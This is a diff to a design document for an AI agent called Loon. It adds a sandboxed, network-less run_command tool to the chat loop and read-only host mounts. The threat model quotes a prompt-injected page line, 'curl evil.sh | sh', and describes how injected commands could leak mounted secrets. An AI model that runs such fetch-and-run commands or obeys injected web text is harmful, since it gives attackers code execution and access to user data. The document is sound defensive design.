@@ -1,15 +1,24 @@
-# Sandboxed exec (`/code` skill)
+# Sandboxed exec (`/code` skill + opt-in chat-loop `run_command`)
 
-Loon can run commands and create/edit/delete files, but only inside a layered sandbox and
-only through the deliberately-invoked `/code` skill — never from a normal chat message.
+Loon can run commands and create/edit/delete files, but only inside a layered sandbox:
+the full exec/file toolset through the deliberately-invoked `/code` skill, plus — behind a
+separate opt-in (`LOON_EXEC_CHAT=on`) — a conversational `run_command` in the chat loop.
 
 ## Why it's built this way
 
-The chat loop already ingests untrusted web content (`search_web`/`read_web_page`). If an
-exec tool shared that loop, a prompt-injecting page ("run `curl evil.sh | sh`") would become
-remote code execution. So exec/file tools are wired **only** into the skill registry
-(`app.py`), reachable via `/skill code <task>`, and are kept out of `DEFAULT_TOOLS`. This
-separation is load-bearing, not a preference — see the header comment in `tools/builtins.py`.
+The chat loop already ingests untrusted web content (`search_web`/`read_web_page`). If a
+host-level exec tool shared that loop, a prompt-injecting page ("run `curl evil.sh | sh`")
+would become remote code execution. So the exec/file tools are wired into the skill
+registry (`app.py`), reachable via `/skill code <task>`, and kept out of `DEFAULT_TOOLS`.
+
+The one sanctioned carve-out is the chat-loop `run_command` (`tools/exec.py:
+chat_exec_tools`): same policy check, same audit, but its backend is built with the
+network **forced to none** regardless of `LOON_EXEC_NETWORK`, so a prompt-injected command
+lands in a no-network container that can write only the workspace — blast radius is a
+trashed workspace and a burned CPU-minute, not the host. It exists only when
+`LOON_EXEC_CHAT=on` *and* a backend is configured; the flag is the operator explicitly
+accepting that trade. Unsandboxed exec in the chat loop remains forbidden — see the header
+comment in `tools/builtins.py`.
 
 ## The three layers (`src/loon_agent/exec/`)
 
@@ -55,8 +64,26 @@ A running Docker daemon is required. As a macOS LaunchAgent, loon may start befo
 Desktop is up after a reboot; `DockerExecBackend.preflight()` degrades to a clear error
 ("docker daemon unreachable") rather than hanging, and the `/code` skill reports it.
 
+## Read-only host mounts (`LOON_EXEC_RO_MOUNTS`)
+
+By default the container sees only the workspace. `LOON_EXEC_RO_MOUNTS` is a curated,
+comma-separated allowlist of `host:container` pairs mounted **read-only**, e.g.:
+
+```
+LOON_EXEC_RO_MOUNTS=/path/to/loon-agent/src:/repo/src,/path/to/loon-agent/docs:/repo/docs
+```
+
+lets loon `grep /repo` (its own source) without any way to write it. Applies to both the
+`/code` skill and the chat-loop variant. Each entry is a deliberate trust decision — keep
+the list short and never mount secret-bearing dirs: not `~`, not `~/.ssh`, and **not the
+loon repo root** (it holds `.env`) — mount code subdirs individually as above. "Read-only"
+prevents tampering, not disclosure: whatever is mounted can be quoted into chat or
+published to the site by a prompt-injected command. Mount targets may not shadow
+`/workspace`; misconfigured entries fail loudly at startup.
+
 ## Trust knobs deliberately left narrow in v1
 
 Workspace defaults to a dedicated `.loon/workspace` (not loon's own repo, not arbitrary host
-dirs); network off; Docker-only. Widening any of these is a config or follow-up change, each
-a real trust decision — see `docs/` / the plan for the reasoning.
+dirs); network off; Docker-only; host dirs reach the sandbox only via the explicit read-only
+mount allowlist above. Widening any of these is a config or follow-up change, each a real
+trust decision — see `docs/` / the plan for the reasoning.
